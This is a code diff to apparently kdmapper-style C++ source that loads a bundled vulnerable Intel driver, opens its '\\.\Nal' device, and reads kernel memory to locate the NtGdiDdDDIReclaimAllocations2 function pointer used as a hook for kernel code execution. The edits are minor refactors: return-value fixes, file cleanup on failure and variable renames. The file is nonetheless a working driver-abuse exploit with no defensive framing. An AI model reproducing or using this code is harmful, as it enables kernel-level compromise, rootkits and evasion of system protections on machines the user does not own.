@@ -14,20 +14,19 @@ HANDLE intel_driver::Load()
 	}
 
 	const std::string driver_path = std::string(temp_directory) + "\\" + driver_name;
-
-	service::StopAndRemove(driver_name);
 	std::remove(driver_path.c_str());
 
 	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver)))
 	{
 		std::cout << "[-] Failed to create vulnerable driver file" << std::endl;
-		return false;
+		return nullptr;
 	}
 
 	if (!service::RegisterAndStart(driver_path))
 	{
 		std::cout << "[-] Failed to register and start service for the vulnerable driver" << std::endl;
-		return false;
+		std::remove(driver_path.c_str());
+		return nullptr;
 	}
 
 	return CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -280,13 +279,13 @@ bool intel_driver::GetNtGdiDdDDIReclaimAllocations2KernelInfo(HANDLE device_hand
 			return false;
 		}
 
-		const uint64_t kernel_function_offset_address = kernel_NtGdiDdDDIReclaimAllocations2 + 0x7;
-		int32_t function_offset = 0; // offset is a SIGNED integer
+		const uint64_t kernel_function_ptr_offset_address = kernel_NtGdiDdDDIReclaimAllocations2 + 0x7;
+		int32_t function_ptr_offset = 0; // offset is a SIGNED integer
 
-		if (!ReadMemory(device_handle, kernel_function_offset_address, &function_offset, sizeof(function_offset)))
+		if (!ReadMemory(device_handle, kernel_function_ptr_offset_address, &function_ptr_offset, sizeof(function_ptr_offset)))
 			return false;
 
-		kernel_function_ptr = kernel_NtGdiDdDDIReclaimAllocations2 + 0xB + function_offset;
+		kernel_function_ptr = kernel_NtGdiDdDDIReclaimAllocations2 + 0xB + function_ptr_offset;
 
 		if (!ReadMemory(device_handle, kernel_function_ptr, &kernel_original_function_address, sizeof(kernel_original_function_address)))
 			return false;
